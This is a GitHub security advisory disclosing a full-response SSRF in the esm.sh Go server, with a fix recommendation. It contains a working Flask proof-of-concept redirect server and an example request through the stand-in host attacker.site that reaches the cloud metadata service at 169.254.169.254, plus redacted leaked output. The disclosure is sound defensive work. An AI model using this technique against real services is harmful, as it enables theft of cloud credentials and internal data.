# [H] esm.sh is vulnerable to full-response SSRF

## Summary
Severity: High
Advisory: GHSA-3c9r-837r-qqm4
CVE: CVE-2025-50180
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-02-25
Source: https://github.com/advisories/GHSA-3c9r-837r-qqm4
Type: github-advisory

## Affected
- Go: `github.com/esm-dev/esm.sh` — affected >=0 <0.0.0-20250616164159-0593516c4cfa

## Details
### Summary

esh.sh is vulnerable to a full-response SSRF, allowing an attacker to retrieve information from internal websites through the vulnerability.

### Details

Vulnerable code location: https://github.com/esm-dev/esm.sh/blob/f80ff8c8d58749e77fa964abde468fc61f8bd89e/server/router.go#L511

If the internal address has a suffix listed below, the attacker can obtain content from the specified internal address.

eg: https://esm.sh/https://local.site/test.md

```
".js", ".ts", ".mjs", ".mts", ".jsx", ".tsx", ".cjs", ".cts", ".vue", ".svelte", ".md", ".css"
```

A 302 redirect can be used to bypass the suffix restriction.

eg: https://esm.sh/https://attacker.site/test.md 

https://attacker.site/test.md 302 redirect to http://169.254.169.254/v1.json

### PoC

Use Flask to start a server that returns a 302 redirect.

```python
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/test.md')
def redirect_test():
    return redirect("http://169.254.169.254/v1.json", code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

Let esh.sh visit this site.

https://esm.sh/https://attacker.site/test.md

Attacker can obtain data from http://169.254.169.254/v1.json.

```
var t=`<p>&lbrace;&quot;bgp&quot;:&lbrace;&quot;ipv4&quot;:&lbrace;&quot;my-address&quot;:&quot;&quot;,&quot;my-asn&quot;:&quot;&quot;,&quot;peer-address&quot;:&quot;&quot;,&quot;peer-asn&quot;:&quot;&quot;&rbrace;,&quot;ipv6&quot;:&lbrace;&quot;my-address&quot;:&quot;&quot;,&quot;my-asn&quot;:&quot;&quot;,&quot;peer-address&quot;:&quot;&quot;,&quot;peer-asn&quot;:&quot;&quot;&rbrace;&rbrace;,&quot;hostname&quot;:&quot;****&quot;,&quot;instance-v2-id&quot;:&quot;****&quot;,&quot;instanceid&quot;:&quot;****&quot;,&quot;interfaces&quot;:[&lbrace;&quot;ipv4&quot;:&lbrace;&quot;additional&quot;:[],&quot;address&quot;:&quot;****&quot;,&quot;gateway&quot;:&quot;****&quot;,&quot;netmask&quot;:&quot;****&quot;,&quot;routes&quot;:[&lbrace;&quot;netmask&quot;:32,&quot;network&quot;:&quot;****&quot;&rbrace;]&rbrace;,&quot;ipv6&quot;:&lbrace;&quot;additional&quot;:[],&quot;address&quot;:&quot;****&quot;,&quot;network&quot;:&quot;****&quot;,&quot;prefix&quot;:&quot;64&quot;&rbrace;,&quot;mac&quot;:&quot;****&quot;,&quot;network-type&quot;:&quot;public&quot;&rbrace;],&quot;nvidia-driver&quot;:[],&quot;public-keys&quot;:[&quot;****&quot;],&quot;region&quot;:&lbrace;&quot;countrycode&quot;:&quot;US&quot;,&quot;regioncode&quot;:&quot;SJC&quot;&rbrace;,&quot;tags&quot;:[]&rbrace;</p>
`,o={},u=t;export{u as default,t as html,o as meta};
```

Decode the data (redacted) .

```json
{"bgp":{"ipv4":{"my-address":"","my-asn":"","peer-address":"","peer-asn":""},"ipv6":{"my-address":"","my-asn":"","peer-address":"","peer-asn":""}},"hostname":"****","instance-v2-id":"****","instanceid":"****","interfaces":[{"ipv4":{"additional":[],"address":"****","gateway":"****","netmask":"****","routes":[{"netmask":32,"network":"****"}]},"ipv6":{"additional":[],"address":"****","network":"****","prefix":"64"},"mac":"****","network-type":"public"}],"nvidia-driver":[],"public-keys":["****"],"region":{"countrycode":"US","regioncode":"SJC"},"tags":[]}
```

### Impact

An attacker can exploit the vulnerability to access internal sites, and in a cloud environment, can retrieve access keys (AK) and secret keys (SK) by accessing the metadata service address.

### Fix

It is recommended to use `safeurl.Client` as a replacement for `http.Client`.

https://github.com/esm-dev/esm.sh/blob/f80ff8c8d58749e77fa964abde468fc61f8bd89e/internal/fetch/fetch.go#L13

https://github.com/doyensec/safeurl

## References
- https://github.com/esm-dev/esm.sh/security/advisories/GHSA-3c9r-837r-qqm4
- https://nvd.nist.gov/vuln/detail/CVE-2025-50180
- https://github.com/esm-dev/esm.sh/pull/1149
- https://github.com/esm-dev/esm.sh/commit/0593516c4cfab49ad3b4900416a8432ff2e23eb0
- https://github.com/esm-dev/esm.sh
- https://github.com/esm-dev/esm.sh/blob/f80ff8c8d58749e77fa964abde468fc61f8bd89e/internal/fetch/fetch.go#L13
- https://github.com/esm-dev/esm.sh/blob/f80ff8c8d58749e77fa964abde468fc61f8bd89e/server/router.go#L511
- https://github.com/esm-dev/esm.sh/releases/tag/v137
